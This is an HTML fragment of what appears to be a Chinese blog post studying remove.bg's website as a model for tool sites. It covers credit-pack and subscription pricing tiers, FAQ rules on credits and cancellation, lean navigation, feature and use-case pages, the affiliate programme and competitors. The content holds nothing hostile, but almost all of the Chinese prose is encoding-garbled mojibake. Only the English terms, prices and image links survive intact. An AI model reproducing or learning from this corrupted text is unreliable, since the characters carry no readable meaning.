<p>å¦‚æœç‚¹å‡»éœ€è¦ä»˜è´¹çš„åŠŸèƒ½ï¼Œä¼šå¼•å¯¼è¿›å…¥ Pricing é¡µé¢ï¼Œè¿™ä¸ª Pricing é¡µé¢ä¹Ÿæ˜¯éå¸¸å€¼å¾—å­¦ä¹ çš„è®¾è®¡ã€‚</p>
<p>é¦–å…ˆï¼Œæ˜¯æœˆä»˜å’Œå¹´ä»˜çš„è®¾è®¡ï¼Œé»˜è®¤å¼•å¯¼å¹´ä»˜ï¼Œä½†æ˜¯å¹´ä»˜æ˜¾ç¤ºçš„æ˜¯æŒ‰æœˆçš„ä»·æ ¼ï¼Œä¹Ÿå°±æ˜¯å¸®ç”¨æˆ·è®¡ç®—å‡ºå¦‚æœå¹´ä»˜ä¼šæ¯ä¸ªæœˆçœ 50%çš„é’±ï¼Œä»è€Œæ‹‰é«˜ç”¨æˆ·çš„ LTVï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„æ‰‹æ®µã€‚</p>
<p>ç„¶åå°±æ˜¯å®ƒçš„ä»·æ ¼æ¢¯åº¦è®¾è®¡ï¼Œä¹Ÿæ˜¯éå¸¸å€¼å¾—å­¦ä¹ çš„ã€‚ç¬¬ä¸€ä¸ªæ¢¯åº¦æ˜¯ï¼Œç™»å½•é€ä¸€ä¸ªç§¯åˆ†ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦ä½ æ³¨å†Œäº†ï¼Œå°±èƒ½æ‹¿åˆ° 1 ä¸ªç§¯åˆ†ã€‚æˆ‘ä»¬åšäº§å“çš„æ—¶å€™ï¼Œæ³¨å†Œç‡ä¹Ÿæ˜¯é‡è¦çš„ä¸€ä¸ªæŒ‡æ ‡ï¼Œå¯ä»¥é‡‡ç”¨è¿™ä¸ªæ–¹å¼æå‡ç”¨æˆ·çš„æ³¨å†Œç‡ã€‚</p>
<p>ç„¶åå°±æ˜¯æŒ‰é‡ä»˜è´¹çš„è®¾è®¡ï¼Œé˜¶æ¢¯å®šä»·ï¼š</p>
<ul>
<li>
<p>3 ç§¯åˆ† $3</p>
</li>
<li>
<p>10 ç§¯åˆ† $9</p>
</li>
<li>
<p>75 ç§¯åˆ† $49</p>
</li>
<li>
<p>200 ç§¯åˆ† $99</p>
</li>
<li>
<p>500 ç§¯åˆ† $199</p>
</li>
<li>
<p>1200 ç§¯åˆ† $399</p>
</li>
<li>
<p>4000 ç§¯åˆ† $999</p>
</li>
<li>
<p>8000 ç§¯åˆ† $1699</p>
</li>
</ul>
<p>è¿™ä¸ªé˜¶æ¢¯è®¾è®¡æˆ‘ä»¬å¯ä»¥å‚è€ƒå­¦ä¹ ï¼Œé¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œå·¥å…·ç«™ä¸€å®šä¸è¦åªæœ‰è®¢é˜…ï¼Œè¦æ”¯æŒæŒ‰é‡è®¡è´¹çš„ï¼Œèƒ½å¤Ÿæœ‰æ•ˆæé«˜ä»˜è´¹è½¬åŒ–ç‡ã€‚</p>
<p>ç„¶åå°±æ˜¯è®¢é˜…é˜¶æ¢¯ï¼š</p>
<p>Lite ç‰ˆæœ¬ï¼Œ$54/å¹´ï¼Œæ”¯æŒåŸºæœ¬çš„ç¼–è¾‘å’Œ API æ“ä½œã€‚40 ç§¯åˆ†/æœˆã€‚</p>
<p>Pro ç‰ˆæœ¬ï¼Œ$234/å¹´ï¼Œæ¯” Lite ç‰ˆæœ¬å¤šäº†ä¸€ä¸ªæ‰¹é‡çš„åŠŸèƒ½ï¼Œ200 ç§¯åˆ†/æœˆã€‚</p>
<p>Volume+ç‰ˆæœ¬ï¼Œ$534/å¹´ï¼Œå¯ä»¥è®¤ä¸ºè¿™æ˜¯ä¼ä¸šç‰ˆæœ¬ï¼Œæ”¯æŒå®šåˆ¶å„ç§å›¾ç‰‡è§„æ ¼ç­‰ç­‰ï¼Œ500 ç§¯åˆ†/æœˆã€‚</p>
<p>ä¸€èˆ¬æˆ‘ä»¬çš„äº§å“ï¼Œæ”¯æŒ 2-3 ä¸ªé˜¶æ¢¯å°±å¯ä»¥äº†ï¼Œå¦‚æœæ²¡èƒ½åŠ›æ”¯æŒä¼ä¸šç‰ˆï¼Œæˆ‘è®¤ä¸ºåšä¸¤ä¸ªç‰ˆæœ¬å°±å¤Ÿç”¨ã€‚</p>
<p>ä¸€å®šè¦æƒ³å¥½ç”¨æˆ·æƒç›Šï¼Œä»€ä¹ˆæƒç›Šæ˜¯é«˜å‡€å€¼ç”¨æˆ·éœ€è¦çš„ï¼Œå®šä»·å¦‚ä½•ï¼Œä»ç”¨æˆ·éœ€æ±‚çš„è§’åº¦å’Œæˆæœ¬ç»¼åˆè€ƒè™‘ã€‚</p>
<h2 data-id="heading-6">07 FAQ æŠŠè§„åˆ™è®²é€</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/355b0870f44343e8b2530e0ad0f3a733~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=gmKYl4%2Fhm%2BlTJEF1rXHZGGOXiYc%3D" alt="" loading="lazy"/></p>
<p>ç„¶åæˆ‘ä»¬æ¥å­¦ä¹ ä¸€ä¸‹å®ƒçš„ Faqï¼Œå·¥å…·ç«™ç‚¹çš„ Faq éå¸¸é‡è¦ï¼Œå°¤å…¶æ˜¯ä»˜è´¹é¡µé¢ï¼Œä½ è¦è¯´æ¸…æ¥šå¾ˆå¤šç”¨æˆ·å…³å¿ƒçš„é—®é¢˜ã€‚</p>
<p>æ¯”å¦‚ï¼Œä¸€ä¸ªç§¯åˆ†æ˜¯ä»€ä¹ˆæ¦‚å¿µï¼Œåœ¨ remove.bg çš„å®šä¹‰é‡Œï¼Œ1 ä¸ªç§¯åˆ†å¯ä»¥å¤„ç†ä¸€å¼ å›¾ç‰‡ï¼Œè¿™å°±å®šä¹‰æ¸…æ¥šäº†ç§¯åˆ†çš„ä»·å€¼ã€‚</p>
<p>å¦å¤–ï¼Œå®ƒè¿˜é™„åŠ è¯´æ˜äº†ï¼Œè®¢é˜…é€çš„ç§¯åˆ†ï¼Œåªåœ¨è®¢é˜…æœŸé—´æœ‰æ•ˆï¼Œè€Œä¸€æ¬¡è´­ä¹°çš„ç§¯åˆ†ï¼Œæ°¸ä¹…æœ‰æ•ˆã€‚</p>
<p>è¿™äº›éƒ½æ˜¯æˆ‘ä»¬éœ€è¦è¯´æ˜çš„è§„åˆ™ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee9de9d991de4f18bca410a5c4be5659~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=uYt8iuYyfFRLqGjPBktr2woip%2FQ%3D" alt="" loading="lazy"/></p>
<p>å®ƒè¿˜è§£é‡Šäº†ä»€ä¹ˆåœºæ™¯é€‚åˆå•ä¹°ç§¯åˆ†ï¼Œä»€ä¹ˆåœºæ™¯é€‚åˆè®¢é˜…ï¼Œé™ä½ç”¨æˆ·å¿ƒæ™ºï¼Œå®é™…ä¸Šè¿™é’ˆå¯¹çš„æ˜¯ä¸åŒçš„ç”¨æˆ·ç¾¤ä½“ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2812cd360284399ac87cfb822db5669~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=TSu0PuW1UGZpY91kMxrzof2TSYk%3D" alt="" loading="lazy"/></p>
<p>ç„¶åï¼Œä¸€å®šè¦å£°æ˜ä½ çš„äº§å“æ˜¯æ”¯æŒå–æ¶ˆè®¢é˜…çš„ï¼Œè¿™ä¹Ÿæ˜¯æœ€åŸºç¡€çš„åˆè§„è¦æ±‚ã€‚å¦åˆ™ç”¨æˆ·å¯ä»¥å»ä»²è£ï¼Œä¼šå¯¼è‡´ä½ å¤§é‡çš„æŸå¤±ã€‚ä»¥åŠå–æ¶ˆè®¢é˜…ä¹‹åï¼Œç§¯åˆ†æ€ä¹ˆå¤„ç†ï¼Œä¸€å®šè¦è¯´æ˜ç™½ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a387b894959749c290e549dc0f47ec0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=0x073nAPA0m2UFRxqOkXVuw3tVc%3D" alt="" loading="lazy"/></p>
<p>æœ€åå°±æ˜¯éšç§é—®é¢˜ï¼Œæµ·å¤–ç”¨æˆ·è¿˜æ˜¯æ¯”è¾ƒæ³¨é‡éšç§çš„ï¼Œå¾ˆå¤šå®¡æ ¸åˆè§„æ¸ é“éƒ½è¦æ±‚ä½ çš„äº§å“ç¬¦åˆ GDPRï¼ˆé€šç”¨æ•°æ®ä¿æŠ¤æ¡ä¾‹ï¼‰ï¼Œä½ è¦åšé¢å‘æ¬§ç›Ÿçš„äº§å“ï¼Œæ˜¯å¿…é¡»è¦æ³¨æ„è¿™ä¸€ç‚¹çš„ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11c595b59f33483181deba2d94ea1b3e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=28lOOdJLW3Yd%2BXLbH9V%2BwN3suJI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">08 ä¿¡æ¯æ¶æ„ï¼šå¯¼èˆªåšå‡æ³•</h2>
<p>ç„¶åæˆ‘ä»¬çœ‹å®ƒçš„å¯¼èˆªæ è®¾è®¡ï¼Œä¹Ÿæ˜¯å€¼å¾—å­¦ä¹ çš„ï¼Œå®ƒçš„å†…é¡µå…¶å®å¾ˆå¤šï¼Œä½†å¹¶ä¸æ˜¯æ¯ä¸€ä¸ªå†…é¡µéƒ½è¦ç¡¬å¡åˆ°å¯¼èˆªæ é‡Œï¼Œå®ƒçš„å¯¼èˆªéå¸¸ç®€å•ï¼š</p>
<ul>
<li>
<p>upload æ˜¯ä¸»åŠŸèƒ½</p>
</li>
<li>
<p>bulk æ˜¯é™„åŠ åŠŸèƒ½ï¼Œä¹Ÿæ˜¯åˆšåˆšæˆ‘ä»¬çœ‹åˆ° pro ç”¨æˆ·çš„æœ€å¤§çš„ä»·å€¼</p>
</li>
<li>
<p>api æ˜¯å¼€æ”¾æ–‡æ¡£</p>
</li>
<li>
<p>plugins æ˜¯æ”¯æŒçš„æ’ä»¶</p>
</li>
<li>
<p>Pricing æ˜¯å®šä»·é¡µ</p>
</li>
</ul>
<p>æˆ‘è§‰å¾—åšäº§å“ï¼Œä¸€å®šè¦å­¦ä¼šåšå‡æ³•ï¼Œå¯¼èˆªå¤ªè‡ƒè‚¿ï¼Œç»™ç”¨æˆ·çš„å¿ƒæ™ºè´Ÿæ‹…å°±å¾ˆé‡ï¼Œä½ ä¸æ˜¯ tob çš„äº§å“ï¼Œè€Œæ˜¯è¿™ç§ toc çš„å‚ç±»äº§å“ï¼Œé‚£å°±å¿…é¡»è¦å­¦ä¼šåšå‡æ³•ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/827fb51803a740ca953b35aea6b155eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=9eNpdcKRXOEDa%2FaqXFtZa5Y5qbE%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸ª bulk é¡µé¢ï¼Œæˆ‘è§‰å¾—éå¸¸å€¼å¾—å­¦ä¹ çš„ç‚¹å°±æ˜¯ï¼Œå®ƒé€šè¿‡é¦–å±çš„åŠ¨å›¾ï¼Œè®©ä½ ç«‹å³èƒ½ç†è§£è¿™ä¸ªåŠŸèƒ½å¸¦æ¥çš„é™„åŠ ä»·å€¼ï¼Œæˆ‘è§‰å¾—è¿™ä¸ªé¡µé¢çš„ CTR ä¼šéå¸¸ä¸é”™ï¼Œéå¸¸æ¸…æ™°æ˜“æ‡‚ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/932d2aa2ec9144cdaf5322ca1c9191c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=BiiEz3%2FRu%2BSjInShixoRCUWlQXk%3D" alt="" loading="lazy"/></p>
<p>plugin é¡µé¢å°±æ˜¯åœ¨å±•ç¤ºå¤§å‚å®åŠ›äº†ï¼Œè¿™ä¹Ÿæ˜¯æŠ¤åŸæ²³ã€‚å°½ç®¡æ˜¯ä¸€ä¸ªå»é™¤èƒŒæ™¯çš„å°éœ€æ±‚ï¼Œå®ƒèƒ½åšå„ç§æ’ä»¶ã€APPï¼Œä¸è¿™ä¹ˆå¤šæ•ˆç‡å·¥å…·æ‰“é€šï¼Œå¦‚æœæˆ‘ä»¬ä»¥ä¸ªäººåŠ›é‡å»å’Œä»–ç«äº‰ï¼Œé‚£æ— å¼‚äºä»¥åµå‡»çŸ³ã€‚</p>
<h2 data-id="heading-8">09 åœºæ™¯ã€åŠŸèƒ½ã€æ¡ˆä¾‹ä¸‰å¥—å†…é¡µçŸ©é˜µ</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/66c5eff2b1af43acbaebd2927537a223~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=maPLEOtSPfZdJhaQXCJcjQSyQWA%3D" alt="" loading="lazy"/></p>
<p>è¿™æ˜¯å®ƒåšçš„ä¸€ä¸ª features é›†åˆé¡µï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œäº§å“çš„æ‰€æœ‰ç‰¹æ€§ï¼Œå®ƒéƒ½åšæˆäº†å†…é¡µï¼Œè€Œä¸”æ¯ä¸ªå†…é¡µéƒ½åŸºæœ¬æœ‰ä¸ªåŠ¨å›¾ï¼Œè¿™æ— è®ºæ˜¯ä» SEO çš„è§’åº¦è¿˜æ˜¯ç”¨æˆ·ä½“éªŒçš„è§’åº¦æ¥è¯´éƒ½ç‰¹åˆ«å¥½ï¼Œæˆ‘è§‰å¾—å¾ˆå€¼å¾—æˆ‘ä»¬å­¦ä¹ ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7afb2b9f85e84fa7926a50bf8d04d082~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=Yawag9GX7aEYQstxyALIkna1eHQ%3D" alt="" loading="lazy"/></p>
<p>ç„¶åå°±æ˜¯å®ƒä¸ºæ¯ä¸€ç§ç”¨æˆ·åœºæ™¯éƒ½åšäº†å†…é¡µï¼Œä½ æ˜¯è®¾è®¡å¸ˆã€å·¥ç¨‹å¸ˆã€Photoshop äººå‘˜ç­‰ç­‰ï¼Œéƒ½åšäº†å†…é¡µã€‚è¿™æ˜¯çœŸæ­£ä»ç”¨æˆ·çš„è§’åº¦å»åšéœ€æ±‚ï¼Œæ·±åˆ»è°ƒç ”è‡ªå·±çš„ç”¨æˆ·ã€å®¢æˆ·ï¼Œåšå¥½åˆ†ç±»ï¼Œåšç²¾è‡´çš„äº§å“ï¼Œè¿™ç‚¹æˆ‘æ˜¯éœ€è¦åæ€å’Œå­¦ä¹ çš„ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab43fa97bba14eaa97c48326bd044edc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=YCCIRPnTWADP7h1XJq160gI3FE8%3D" alt="" loading="lazy"/></p>
<p>è¿™æ˜¯å®ƒçš„ç”¨æˆ·æ¡ˆä¾‹ï¼Œæ¯ä¸ªç”¨æˆ·çš„ç²¾å½©æ•…äº‹éƒ½è®°å½•ä¸‹æ¥ï¼Œå¯¹äºä¸€ä¸ªäº§å“æ¥è¯´ï¼Œè¿™æ˜¯æœ€æœ‰åŠ›çš„è¯è¨€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9350eb2233a4f1caddcf84bc00a2840~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=y8yq8uLF47hu0vun0e5BFE%2BR6NE%3D" alt="" loading="lazy"/></p>
<p>ç„¶åæ˜¯å®ƒçš„ blog é¡µé¢ï¼Œä½œä¸ºå·¥å…·ç«™ç‚¹ï¼Œå¿…é¡»è¦å†™ blogï¼Œé€šè¿‡ blog æˆ‘ä»¬å°±çœ‹å‡º canva è¿™ä¸ªå›¢é˜Ÿçš„ SEO åŠŸåº•äº†ï¼ŒåŸºæœ¬ä¸Šæ‰¿æ¥äº†æ‰€æœ‰ how-toã€best xxx ç­‰é•¿å°¾éœ€æ±‚æµé‡ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬å¿…é¡»è¦æŒæ¡çš„ SEO æŠ€å·§ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46c82f85ba5547ae8a399f32e31569f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=goy%2FDJhfytx90YTbOKaKkm0SD1o%3D" alt="" loading="lazy"/></p>
<p>è€Œä¸”éšä¾¿ç‚¹å‡»å»ä¸€ç¯‡åšå®¢ï¼Œå‘ç°å®ƒæ˜¯çœŸæ­£åœ¨ç”¨å¿ƒå†™ï¼Œä»ç”¨æˆ·çš„è§’åº¦å»å†™ï¼Œå¹¶ä¸æ˜¯ä¸ºäº† SEO è€Œ SEOã€‚</p>
<h2 data-id="heading-9">10 å¢é•¿å·¥å…·ï¼šNewsletter + ProductHunt å°ç»„ä»¶</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/231d85222d634769bed197eaae1ace58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=7gCoksCQY%2F%2BE06Aqpr0o0Hnujoc%3D" alt="" loading="lazy"/></p>
<p>å®ƒçš„åšå®¢ä¸‹æ–¹æœ‰ newsletter çš„è®¢é˜…ï¼Œå’Œ ProductHunt çš„å°ç»„ä»¶ï¼Œè¿™ä¸ªæˆ‘è§‰å¾—ä¹Ÿæ˜¯å€¼å¾—å­¦ä¹ çš„ç‚¹ã€‚æˆ‘ä»¬çœŸæ­£åšä¸€ä¸ªé•¿æœŸçš„äº§å“ï¼Œä¸€å®šè¦åš EDMï¼Œä¸€å®šè¦æŠ“ä½ä»»ä½•å¯ä»¥æç•™å­˜çš„æœºä¼šã€‚</p>
<h2 data-id="heading-10">11 Affiliate ä½“ç³»ï¼šè§„åˆ™é€æ˜æ‰å¥½æ‹›å‹Ÿ</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afeea065aba842909257472839cdad52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=Q3tVqxxIn0Gqajl9PkTfvZH9epQ%3D" alt="" loading="lazy"/></p>
<p>è¿™æ˜¯å®ƒçš„ Affliate é¡µé¢è®¾è®¡ï¼Œè¿™æ¬¡æˆ‘çš„äº§å“ä¹Ÿæ˜¯è¢«è¿«é‡‡ç”¨äº† Affliate çš„ï¼Œæœ€åå‘ç° Affliate çœŸé¦™ã€‚</p>
<p>ä½ å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜ç¡®å†™äº† Affliate æ˜¯ 15%çš„æ”¶ç›Šï¼Œå¹¶ä¸”æœ‰å¾ˆå¤š Affliate ç›¸å…³çš„ faqï¼Œéƒ½éå¸¸ä¸“ä¸šï¼Œå€¼å¾—å­¦ä¹ ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc40708b03a245e89cc345d67a6e51e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=wIsSypmtkWXmhM%2BXnTP447J%2FXm8%3D" alt="" loading="lazy"/></p>
<p>æ¯”å¦‚ï¼Œremove.bg æ˜¯å¯ä»¥å°†ç”¨æˆ·è®¢é˜…ç»­è´¹çš„æ”¶ç›Šï¼Œç®—ä½œ Affliate çš„ï¼Œè¿™ç‚¹è¦æ¸…æ™°è¯´æ˜ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b8317e7858341c4b2bfa5c83c2b3081~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=l%2BHaTEsEbWqoKsdgFkuDa8gaf3o%3D" alt="" loading="lazy"/></p>
<p>è¿˜æœ‰ï¼Œå“ªäº›æ¨å¹¿è¡Œä¸ºæ˜¯ä¸è¢«å…è®¸çš„ï¼Œè¿™ç‚¹è¦æå‰è¯´æ˜ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¸å¸Œæœ›å¯¹æ–¹æŠ•æµæ¥å½±å“æˆ‘ä»¬è‡ªå·±çš„ seo ç­‰ç­‰ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a5fa57909274e13be91b3dc7cc4a9e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=fd4TK%2FvSr5zGhK2GvMv3Mz1DA0M%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1836814955fa495fb243c57bc8f80d8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=mQF%2BKA%2BGzWXksgaGCYOgrXI2tdU%3D" alt="" loading="lazy"/></p>
<p>æ”¶ç›Šç»“ç®—å‘¨æœŸã€å¦‚æœä»˜è´¹ã€cookie è¿½è¸ªæœ‰æ•ˆæœŸä»€ä¹ˆçš„ï¼Œéƒ½è¦æ¸…æ™°ã€‚</p>
<p>ä»¥ä¸Šè¿™äº›ï¼Œéƒ½æ˜¯æˆ‘ä¸Šä¸ªäº§å“ Affliate è¸©çš„å‘ï¼Œè·Ÿå¯¹æ–¹æ¥å› 20 å¤šä¸ªé‚®ä»¶æ‰æŠŠè¿™ä¸ªä¸œè¥¿èŠæ˜ç™½ã€‚</p>
<p>remove.bg å°±éå¸¸å€¼å¾—å­¦ä¹ ï¼Œç›´æ¥åšä¸ª Affliate é¡µé¢ï¼Œæ‰€æœ‰çš„è§„åˆ™éƒ½æ¸…æ¥šäº†ï¼Œå¯ä»¥å¸å¼•æ›´å¤šå®¢æˆ·æ¥å¯¹ä½ çš„äº§å“è¿›è¡Œåˆ†é”€ã€‚</p>
<h2 data-id="heading-11">12 å¤šè¯­è¨€ &amp; æ¸ é“çŸ©é˜µ</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c366de8f06f94aea82de3765d9b8cf65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=9uKEZFBwBMFZDPjTVBqFyCHDs3o%3D" alt="" loading="lazy"/></p>
<p>å¦å¤–å°±æ˜¯å®ƒæ”¯æŒäº†åŸºæœ¬ä¸Šä¸»æµå›½å®¶çš„è¯­è¨€ï¼Œåšæµ·å¤–ç«™ç‚¹ï¼Œå¦‚æœæˆ‘ä»¬è¦é¢å‘å…¨çƒ 70 äº¿äººå£å¸‚åœºï¼Œå¤šè¯­è¨€å¿…ä¸å¯å°‘ï¼Œå¯èƒ½å¸¦æ¥å‡ åå€çš„æµé‡ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16cbc622950b4b6db8c0446f7f5f53db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=6wyFb4ZB2aoPkxf%2F7ovEI8AB1Jo%3D" alt="" loading="lazy"/></p>
<p>æœ€åæˆ‘ä»¬å­¦ä¹ ä¸€ä¸‹å®ƒçš„è¥é”€æ¸ é“ï¼ŒåŒ…æ‹¬ Facebookã€Instagramã€Twitterã€TikTokã€Youtubeã€LinkedInã€‚</p>
<p>æˆ‘å°±ä¸ä¸€ä¸ªä¸ªæˆªå›¾äº†ï¼Œè¿™åŸºæœ¬ä¸Šå¯ä»¥å½“åšèŒƒä¾‹ï¼Œæˆ‘ä»¬åšæµ·å¤–äº§å“é‡ç‚¹éœ€è¦å»åšçš„å“ç‰Œæ¸ é“ã€‚</p>
<h2 data-id="heading-12">13 ç«äº‰æ ¼å±€ï¼šå¤§ç›˜å¤Ÿå¤§ï¼Œä»æœ‰åˆ‡å£</h2>
<p>æœ€åæˆ‘ä»¬å¯ä»¥é€šè¿‡ SImilarWeb å»çœ‹çœ‹å®ƒçš„ç«äº‰è€…ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/105e3c8bc261410e91c6d74efd514310~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=TvDSpZt28MPaIGIvP1VXsLqyDIs%3D" alt="" loading="lazy"/></p>
<p>æ¯”å¦‚ pixelcutï¼Œè¿™ä¸ªç«™ç‚¹æœ‰ä¸¤åƒä¸‡çš„è®¿é—®é‡ï¼Œæˆ‘ä»¬çœ‹å®ƒçš„æœç´¢è¯ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d125e3247c394f4aa9c6e6de3d109aeb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=qUo7cSmvRy6XdTnqTnncg3wsNWA%3D" alt="" loading="lazy"/></p>
<p>æ˜¯ä¸æ˜¯ä¹Ÿæ˜¯ background removerï¼Ÿè¿˜æœ‰ photoroomï¼Œä¹Ÿæœ‰ä¸¤åƒä¸‡çš„è®¿é—®é‡ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f77b70a6a387470ab95983670567eb7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=yNtfqg64kNZJ8cu6jSlwcHXDHik%3D" alt="" loading="lazy"/></p>
